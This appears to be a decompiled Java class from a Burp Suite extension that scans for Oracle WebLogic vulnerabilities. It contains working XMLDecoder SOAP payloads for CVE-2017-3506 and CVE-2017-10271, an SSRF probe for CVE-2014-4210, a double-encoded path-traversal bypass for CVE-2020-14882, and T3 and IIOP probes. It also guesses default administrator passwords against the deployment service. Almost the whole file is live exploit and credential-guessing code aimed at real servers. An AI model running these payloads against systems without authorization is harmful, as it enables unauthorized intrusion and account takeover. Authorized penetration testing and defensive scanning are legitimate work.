/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package burp.ScanFun;

import burp.BurpExtender;
import burp.Common;
import burp.GenPoc;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.Listen.IBackend;
import burp.utils.Utils;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.List;
import java.util.Objects;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class WeblogicScan {
    public static String[] password = new String[]{"weblogic", "weblogic1", "weblogic123", "Oracle@123"};
    private static String[] weblogic_finger_url = new String[]{"/console/", "/console/index.jsp", "/console/login/LoginForm.jsp"};
    private static String payload_CVE_2017_3506_and_10271 = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soapenv:Header>\n    <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n      <java version=\"1.8\" class=\"java.beans.XMLDecoder\">\n\t\t<void id=\"url\" class=\"java.net.URL\">\n  \t<string>http://DNSlog</string>\n\t\t</void>\n\t\t\t\t<void idref=\"url\">\n  \t\t\t<void id=\"stream\" method =\"openStream\"/>\n\t\t\t</void>\n      </java>\n    </work:WorkContext>\n    </soapenv:Header>\n  <soapenv:Body/>\n</soapenv:Envelope>";

    public static IHttpRequestResponse WeblogicBannerPassCVE_2019_2618Scan(IHttpRequestResponse reqres, IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers, String custompath) throws InterruptedException {
        String res;
        List<String> headers = helpers.analyzeRequest(reqres.getRequest()).getHeaders();
        URL url = helpers.analyzeRequest(reqres).getUrl();
        headers.set(0, "POST " + custompath + "/bea_wls_deployment_internal/DeploymentService HTTP/1.1");
        byte[] body = helpers.buildHttpMessage(headers, null);
        IHttpRequestResponse weblogicreqres = callbacks.makeHttpRequest(reqres.getHttpService(), body);
        if (weblogicreqres != null && weblogicreqres.getResponse() != null && ((res = Common.getResbody(weblogicreqres.getResponse(), helpers)).contains("No user name or password") || res.contains("Console/Management"))) {
            headers.add("username: weblogic");
            headers.add("password: password");
            for (int i = 0; i < password.length; ++i) {
                headers.set(headers.size() - 1, "password: " + password[i]);
                body = helpers.buildHttpMessage(headers, null);
                weblogicreqres = callbacks.makeHttpRequest(reqres.getHttpService(), body);
                if (weblogicreqres != null && weblogicreqres.getResponse() != null && !(res = Common.getResbody(weblogicreqres.getResponse(), helpers)).contains("Invalid user name or password") && helpers.analyzeResponse(weblogicreqres.getResponse()).getStatusCode() == 200) {
                    BurpExtender.scannedDomainURL_weblogic_rce.add(url.getHost() + ":" + url.getPort());
                    return weblogicreqres;
                }
                try {
                    Thread.currentThread();
                    Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
                    continue;
                } catch (InterruptedException e) {
                    BurpExtender.stdout.println(e.getMessage());
                }
            }
        }
        return null;
    }

    public static IHttpRequestResponse WeblogicUddiExplorerScan(IHttpRequestResponse reqres, IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers, String custompath) {
        String res;
        List<String> headers = helpers.analyzeRequest(reqres.getRequest()).getHeaders();
        URL url = helpers.analyzeRequest(reqres).getUrl();
        headers.set(0, "GET " + custompath + "/uddiexplorer/ HTTP/1.1");
        byte[] body = helpers.buildHttpMessage(headers, null);
        IHttpRequestResponse weblogicreqres = callbacks.makeHttpRequest(reqres.getHttpService(), body);
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            BurpExtender.stdout.println(e.getMessage());
        }
        if (weblogicreqres != null && weblogicreqres.getResponse() != null && ((res = Common.getResbody(weblogicreqres.getResponse(), helpers)).contains("Deploying application for /uddiexplorer/") || res.contains("Setup UDDI Explorer"))) {
            BurpExtender.scannedDomainURL_weblogic_rce.add(url.getHost() + ":" + url.getPort());
            return weblogicreqres;
        }
        return null;
    }

    public static IHttpRequestResponse WeblogicCVE_2020_2551Scan(IHttpRequestResponse reqres, IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers, String custompath) {
        String res;
        List<String> headers = helpers.analyzeRequest(reqres.getRequest()).getHeaders();
        URL url = helpers.analyzeRequest(reqres).getUrl();
        headers.set(0, "GET " + custompath + "/console/login/LoginForm.jsp HTTP/1.1");
        byte[] body = helpers.buildHttpMessage(headers, null);
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            BurpExtender.stdout.println(e.getMessage());
        }
        IHttpRequestResponse weblogicreqres = callbacks.makeHttpRequest(reqres.getHttpService(), body);
        if (weblogicreqres != null && weblogicreqres.getResponse() != null && ((res = Common.getResbody(weblogicreqres.getResponse(), helpers)).contains("10.3.6.0") || res.contains("12.1.3.0") || res.contains("12.2.1.3") || res.contains("12.2.1.4"))) {
            BurpExtender.scannedDomainURL_weblogic_rce.add(url.getHost() + ":" + url.getPort());
            return weblogicreqres;
        }
        return null;
    }

    public static IHttpRequestResponse WeblogicCVE_2019_2729Scan(IHttpRequestResponse reqres, IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers, String custompath) {
        String res;
        List<String> headers = helpers.analyzeRequest(reqres.getRequest()).getHeaders();
        URL url = helpers.analyzeRequest(reqres).getUrl();
        headers.set(0, "GET " + custompath + "/wls-wsat/CoordinatorPortType HTTP/1.1");
        byte[] body = helpers.buildHttpMessage(headers, null);
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            BurpExtender.stdout.println(e.getMessage());
        }
        IHttpRequestResponse weblogicreqres = callbacks.makeHttpRequest(reqres.getHttpService(), body);
        if (weblogicreqres != null && weblogicreqres.getResponse() != null && (res = Common.getResbody(weblogicreqres.getResponse(), helpers)).contains("Web Services") && res.contains("CoordinatorPortTypePortImpl")) {
            BurpExtender.scannedDomainURL_weblogic_rce.add(url.getHost() + ":" + url.getPort());
            return weblogicreqres;
        }
        headers.set(0, "GET " + custompath + "/_async/AsyncResponseService HTTP/1.1");
        body = helpers.buildHttpMessage(headers, null);
        weblogicreqres = callbacks.makeHttpRequest(reqres.getHttpService(), body);
        if (weblogicreqres != null && weblogicreqres.getResponse() != null && (res = Common.getResbody(weblogicreqres.getResponse(), helpers)).contains("WSDL page") && res.contains("AsyncResponseService home page")) {
            BurpExtender.scannedDomainURL_weblogic_rce.add(url.getHost() + ":" + url.getPort());
            return weblogicreqres;
        }
        return null;
    }

    public static IHttpRequestResponse WeblogicCVE_2018_2894Scan(IHttpRequestResponse reqres, IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers, String custompath) {
        String res;
        List<String> headers = helpers.analyzeRequest(reqres.getRequest()).getHeaders();
        URL url = helpers.analyzeRequest(reqres).getUrl();
        headers.set(0, "GET " + custompath + "/ws_utc/config.do HTTP/1.1");
        byte[] body = helpers.buildHttpMessage(headers, null);
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            BurpExtender.stdout.println(e.getMessage());
        }
        IHttpRequestResponse weblogicreqres = callbacks.makeHttpRequest(reqres.getHttpService(), body);
        if (weblogicreqres != null && weblogicreqres.getResponse() != null && ((res = Common.getResbody(weblogicreqres.getResponse(), helpers)).contains("Deploying application for") || res.contains("label_choose_wsdl_recent"))) {
            BurpExtender.scannedDomainURL_weblogic_rce.add(url.getHost() + ":" + url.getPort());
            return weblogicreqres;
        }
        return null;
    }

    public static IHttpRequestResponse WeblogicCVE_2014_4210Scan(IHttpRequestResponse reqres, IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers, IBackend dnslog, String custompath) {
        List<String> headers = helpers.analyzeRequest(reqres.getRequest()).getHeaders();
        URL url = helpers.analyzeRequest(reqres).getUrl();
        String host = reqres.getHttpService().getHost();
        String domain = "weblogic." + GenPoc.Makenewhost(host) + dnslog.getNewPayload();
        headers.set(0, "GET " + custompath + "/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://" + domain + " HTTP/1.1");
        byte[] body = helpers.buildHttpMessage(headers, null);
        IHttpRequestResponse weblogicreqres = callbacks.makeHttpRequest(reqres.getHttpService(), body);
        if (weblogicreqres != null && weblogicreqres.getResponse() != null && dnslog.CheckResult(domain)) {
            try {
                Thread.currentThread();
                Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
            } catch (InterruptedException e) {
                BurpExtender.stdout.println(e.getMessage());
            }
            BurpExtender.scannedDomainURL_weblogic_rce.add(url.getHost() + ":" + url.getPort());
            return weblogicreqres;
        }
        return null;
    }

    public static IHttpRequestResponse WeblogicCVE_2017_3506Scan(IHttpRequestResponse reqres, IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers, IBackend dnslog, String custompath) {
        List<String> headers = helpers.analyzeRequest(reqres.getRequest()).getHeaders();
        URL url = helpers.analyzeRequest(reqres).getUrl();
        headers.set(0, "POST " + custompath + "/wls-wsat/RegistrationRequesterPortType HTTP/1.1");
        headers.add("Content-Type: text/xml;charset=UTF-8");
        String host = reqres.getHttpService().getHost();
        String domain = "weblogic." + GenPoc.Makenewhost(host) + dnslog.getNewPayload();
        byte[] body = helpers.buildHttpMessage(headers, payload_CVE_2017_3506_and_10271.replace("DNSlog", domain).getBytes(StandardCharsets.UTF_8));
        IHttpRequestResponse weblogicreqres = callbacks.makeHttpRequest(reqres.getHttpService(), body);
        if (weblogicreqres != null && weblogicreqres.getResponse() != null) {
            try {
                Thread.currentThread();
                Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
            } catch (InterruptedException e) {
                BurpExtender.stdout.println(e.getMessage());
            }
            if (dnslog.CheckResult(domain)) {
                BurpExtender.scannedDomainURL_weblogic_rce.add(url.getHost() + ":" + url.getPort());
                return weblogicreqres;
            }
        }
        return null;
    }

    public static IHttpRequestResponse WeblogicCVE_2017_10271Scan(IHttpRequestResponse reqres, IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers, IBackend dnslog, String custompath) {
        List<String> headers = helpers.analyzeRequest(reqres.getRequest()).getHeaders();
        URL url = helpers.analyzeRequest(reqres).getUrl();
        headers.set(0, "POST " + custompath + "/wls-wsat/CoordinatorPortType HTTP/1.1");
        headers.add("Content-Type: text/xml;charset=UTF-8");
        String host = reqres.getHttpService().getHost();
        String domain = "weblogic." + GenPoc.Makenewhost(host) + dnslog.getNewPayload();
        byte[] body = helpers.buildHttpMessage(headers, payload_CVE_2017_3506_and_10271.replace("DNSlog", domain).getBytes(StandardCharsets.UTF_8));
        IHttpRequestResponse weblogicreqres = callbacks.makeHttpRequest(reqres.getHttpService(), body);
        if (weblogicreqres != null && weblogicreqres.getResponse() != null) {
            try {
                Thread.currentThread();
                Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
            } catch (InterruptedException e) {
                BurpExtender.stdout.println(e.getMessage());
            }
            if (dnslog.CheckResult(domain)) {
                BurpExtender.scannedDomainURL_weblogic_rce.add(url.getHost() + ":" + url.getPort());
                return weblogicreqres;
            }
        }
        return null;
    }

    public static IHttpRequestResponse WeblogicCVE_2020_14882Scan(IHttpRequestResponse reqres, IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers, String custompath) {
        String res;
        String cookie;
        int i;
        List<String> resp_headers;
        List<String> headers = helpers.analyzeRequest(reqres.getRequest()).getHeaders();
        URL url = helpers.analyzeRequest(reqres).getUrl();
        headers.set(0, "GET " + custompath + "/console/images/%252E%252E%252Fconsole.portal HTTP/1.1");
        byte[] body = helpers.buildHttpMessage(headers, null);
        IHttpRequestResponse weblogicreqres = callbacks.makeHttpRequest(reqres.getHttpService(), body);
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            BurpExtender.stdout.println(e.getMessage());
        }
        if (weblogicreqres != null && weblogicreqres.getResponse() != null) {
            resp_headers = helpers.analyzeResponse(weblogicreqres.getResponse()).getHeaders();
            if (helpers.analyzeResponse(weblogicreqres.getResponse()).getStatusCode() == 302) {
                for (i = 0; i < resp_headers.size(); ++i) {
                    if (!resp_headers.get(i).contains("Set-Cookie:")) continue;
                    cookie = resp_headers.get(i).split(":", 2)[1];
                    headers.add("Cookie: " + cookie);
                    body = helpers.buildHttpMessage(headers, null);
                    weblogicreqres = callbacks.makeHttpRequest(reqres.getHttpService(), body);
                    if (weblogicreqres == null || weblogicreqres.getResponse() == null || !(res = Common.getResbody(weblogicreqres.getResponse(), helpers)).contains("WLS \u63a7\u5236\u53f0") && !res.contains("\u7ba1\u7406\u63a7\u5236\u53f0\u4e3b\u9875")) continue;
                    BurpExtender.scannedDomainURL_weblogic_rce.add(url.getHost() + ":" + url.getPort());
                    return weblogicreqres;
                }
            }
        }
        headers = helpers.analyzeRequest(reqres.getRequest()).getHeaders();
        headers.set(0, "GET " + custompath + "/console/css/%252e%252e%252fconsole.portal HTTP/1.1");
        body = helpers.buildHttpMessage(headers, null);
        weblogicreqres = callbacks.makeHttpRequest(reqres.getHttpService(), body);
        if (weblogicreqres != null && weblogicreqres.getResponse() != null) {
            resp_headers = helpers.analyzeResponse(weblogicreqres.getResponse()).getHeaders();
            if (helpers.analyzeResponse(weblogicreqres.getResponse()).getStatusCode() == 302) {
                for (i = 0; i < resp_headers.size(); ++i) {
                    if (!resp_headers.get(i).contains("Set-Cookie:")) continue;
                    cookie = resp_headers.get(i).split(":", 2)[1];
                    headers.add("Cookie: " + cookie);
                    body = helpers.buildHttpMessage(headers, null);
                    weblogicreqres = callbacks.makeHttpRequest(reqres.getHttpService(), body);
                    if (weblogicreqres == null || weblogicreqres.getResponse() == null || !(res = Common.getResbody(weblogicreqres.getResponse(), helpers)).contains("WLS \u63a7\u5236\u53f0")) continue;
                    BurpExtender.scannedDomainURL_weblogic_rce.add(url.getHost() + ":" + url.getPort());
                    return weblogicreqres;
                }
            }
        }
        return null;
    }

    public static IHttpRequestResponse WeblogicFingerScan(IHttpRequestResponse reqres, IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers) {
        String res;
        List<String> headers = helpers.analyzeRequest(reqres.getRequest()).getHeaders();
        for (int i = 0; i < weblogic_finger_url.length; ++i) {
            headers.set(0, "GET " + weblogic_finger_url[i] + " HTTP/1.1");
            int cookie_num = 0;
            for (int j = 0; j < headers.size(); ++j) {
                if (!headers.get(j).contains("Cookie:")) continue;
                cookie_num = j;
                break;
            }
            if (cookie_num != 0) {
                headers.remove(cookie_num);
            }
            byte[] body = helpers.buildHttpMessage(headers, null);
            IHttpRequestResponse weblogicreqres = callbacks.makeHttpRequest(reqres.getHttpService(), body);
            if (weblogicreqres != null && weblogicreqres.getResponse() != null && (new String(weblogicreqres.getResponse()).contains("ADMINCONSOLESESSION") || new String(weblogicreqres.getResponse()).contains("Deploying application for /console/"))) {
                return weblogicreqres;
            }
            try {
                Thread.currentThread();
                Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
                continue;
            } catch (InterruptedException e) {
                BurpExtender.stdout.println(e.getMessage());
            }
        }
        headers.set(0, "GET /" + Utils.GetRandomString(6) + " HTTP/1.1");
        byte[] body = helpers.buildHttpMessage(headers, null);
        IHttpRequestResponse weblogicreqres = callbacks.makeHttpRequest(reqres.getHttpService(), body);
        if (weblogicreqres != null && weblogicreqres.getResponse() != null && (res = Common.getResbody(weblogicreqres.getResponse(), helpers)).contains("From RFC 2068") && res.contains("Error 404--Not Found")) {
            return weblogicreqres;
        }
        try {
            Thread.currentThread();
            Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
        } catch (InterruptedException e) {
            BurpExtender.stdout.println(e.getMessage());
        }
        headers.set(0, "POST /bea_wls_deployment_internal/DeploymentService HTTP/1.1");
        body = helpers.buildHttpMessage(headers, null);
        weblogicreqres = callbacks.makeHttpRequest(reqres.getHttpService(), body);
        if (weblogicreqres != null && weblogicreqres.getResponse() != null && ((res = Common.getResbody(weblogicreqres.getResponse(), helpers)).contains("No user name or password") || res.contains("Console/Management"))) {
            return weblogicreqres;
        }
        return null;
    }

    public static IHttpRequestResponse WeblogicT3Scan(IHttpRequestResponse reqres, IExtensionHelpers helpers) {
        Matcher matcher;
        URL url = helpers.analyzeRequest(reqres).getUrl();
        String t3_poc = "t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n";
        String socketRESP = new String(Objects.requireNonNull(WeblogicScan.sendSocket(url.getHost(), url.getPort(), 5000, t3_poc.getBytes())));
        if (socketRESP != null && !socketRESP.equals("") && (matcher = Pattern.compile("HELO:(.*).false").matcher(socketRESP)).find()) {
            return reqres;
        }
        return null;
    }

    public static IHttpRequestResponse WeblogicIIOPScan(IHttpRequestResponse reqres, IExtensionHelpers helpers) {
        URL url = helpers.analyzeRequest(reqres).getUrl();
        String iiop_poc_base64 = "R0lPUAECAAMAAAAXAAAAAgAAAAAAAAALTmFtZVNlcnZpY2U=";
        byte[] iiop_poc = Base64.getDecoder().decode(iiop_poc_base64);
        String socketRESP = new String(Objects.requireNonNull(WeblogicScan.sendSocket(url.getHost(), url.getPort(), 5000, iiop_poc)));
        if (socketRESP != null && !socketRESP.equals("") && socketRESP.contains("GIOP") && socketRESP.contains("weblogic")) {
            return reqres;
        }
        return null;
    }

    /*
     * WARNING - Removed try catching itself - possible behaviour change.
     */
    public static byte[] sendSocket(String address, int port, int timeout2, byte[] message) {
        Socket client = null;
        try {
            int c;
            client = new Socket();
            InetSocketAddress serverAddr = new InetSocketAddress(address, port);
            client.connect(serverAddr, timeout2);
            BufferedOutputStream out = new BufferedOutputStream(client.getOutputStream());
            ((OutputStream)out).write(message);
            ((OutputStream)out).flush();
            BufferedInputStream in = new BufferedInputStream(client.getInputStream());
            StringBuilder inMessage = new StringBuilder();
            long start = System.currentTimeMillis();
            while (System.currentTimeMillis() - start < 2000L && (c = in.read()) != -1 && c != 10 && !String.valueOf(inMessage).contains("weblogic")) {
                inMessage.append((char)c);
            }
            byte[] byArray = String.valueOf(inMessage).getBytes();
            return byArray;
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (client != null) {
                try {
                    client.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
        return null;
    }
}

